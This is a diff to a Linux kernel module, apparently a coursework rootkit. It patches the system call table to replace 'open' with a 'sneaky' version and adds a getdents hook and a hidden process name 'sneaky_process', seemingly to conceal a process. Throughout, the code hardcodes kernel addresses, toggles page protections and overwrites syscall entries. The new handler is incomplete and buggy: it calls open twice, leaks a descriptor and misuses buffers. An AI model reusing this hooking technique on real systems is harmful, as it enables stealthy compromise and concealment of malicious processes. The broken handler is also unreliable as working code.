@@ -1,13 +1,17 @@
 #include <asm/cacheflush.h>
 #include <asm/current.h> // process information
 #include <asm/page.h>
-#include <asm/unistd.h>    // for system call constants
+#include <asm/uaccess.h>
+#include <asm/unistd.h> // for system call constants
+#include <linux/file.h>
+#include <linux/fs.h>
 #include <linux/highmem.h> // for changing page permissions
 #include <linux/init.h>    // for entry/exit macros
 #include <linux/kallsyms.h>
 #include <linux/kernel.h> // for printk and other kernel bits
 #include <linux/module.h> // for all modules
 #include <linux/sched.h>
+#include <linux/string.h>
 
 // Macros for kernel functions to alter Control Register 0 (CR0)
 // This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -25,12 +29,18 @@ void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
 void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 
 // customized info
+#define BUF_SIZE 512
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yuefan Yu");
 static int pid = 0;
-static char *pid_s = "";
 module_param(pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
-module_param(pid_s, charp, 0000);
+char *processname = "sneaky_process";
+struct linux_dirent {
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[];
+};
 // This is a pointer to the system call table in memory
 // Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 // We're getting its adddress from the System.map file (see above).
@@ -41,10 +51,18 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 // should expect ti find its arguments on the stack (not in registers).
 // This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
-
+asmlinkage long (*getdents)(unsigned int fd, struct linux_dirent64 __user *dirp,
+                            int count);
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
+  int fd;
+  char buf[BUF_SIZE];
   printk(KERN_INFO "Very, very Sneaky!\n");
+
+  fd = original_call(pathname, flags);
+
+  // struct linux_dirent *d;
+  getdents(fd, (void *)buf, BUF_SIZE);
   return original_call(pathname, flags);
 }
 
@@ -65,6 +83,7 @@ static int initialize_sneaky_module(void) {
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_call = (void *)*(sys_call_table + __NR_open);
+  getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   // Revert page to read-only
